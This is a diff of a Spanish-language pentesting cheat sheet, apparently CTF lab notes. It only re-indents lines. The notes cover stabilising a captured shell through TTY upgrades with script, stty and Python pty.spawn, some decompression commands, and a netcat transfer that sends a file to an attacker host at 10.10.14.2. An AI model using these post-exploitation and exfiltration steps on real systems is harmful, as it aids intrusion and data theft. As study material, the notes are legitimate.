@@ -2,41 +2,41 @@
 ### Tratamiento de la TTY
 
 ```python
-script /dev/null -c bash # Lanza pseudoconsola
+	script /dev/null -c bash # Lanza pseudoconsola
 
-[ctrl+z] # Suspende la shell actual
+	[ctrl+z] # Suspende la shell actual
 
-stty raw -echo
+	stty raw -echo
 
-fg # Recupera la shell suspendida
+	fg # Recupera la shell suspendida
 
-reset "xterm" # Reinicia la configuración de la terminal
+	reset "xterm" # Reinicia la configuración de la terminal
 
-xterm # Especifica el tipo de terminal
+	xterm # Especifica el tipo de terminal
 
-export TERM=xterm # Asigna xterm a la variable TERM
+	export TERM=xterm # Asigna xterm a la variable TERM
 
-export SHELL=bash # Asigna bash a la variable SHELL
+	export SHELL=bash # Asigna bash a la variable SHELL
 
-stty rows <VALOR_FILAS> columns <VALOR_COLUMNAS>
+	stty rows <VALOR_FILAS> columns <VALOR_COLUMNAS>
 
-Para ver el valor de filas y columnas de nuestra terminal se utiliza el comando -> stty -a
+	Para ver el valor de filas y columnas de nuestra terminal se utiliza el comando -> stty -a
  ```
 ### TTY Shell con Python
 
 ```python
-python -c 'import pty; pty.spawn("/bin/sh")'
+	python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 ### Descompresión
 
 ```python
 #.tar
 
-tar -xf archive.tar.gz
+	tar -xf archive.tar.gz
 
 #.gz
 
-gzip -d file.gz
+	gzip -d file.gz
 
 #.zip
 
@@ -82,11 +82,11 @@ ftp <SERVER_IP>
 
 #Servidor
 
-nc 10.10.14.2 4242 < file.tgz
+	nc 10.10.14.2 4242 < file.tgz
 
 #Cliente
 
-nc -lvnp 4242 > file.tgz
+	nc -lvnp 4242 > file.tgz
 
 	maquina atacante
 	nc -lvnp "Ports" > "archivo"
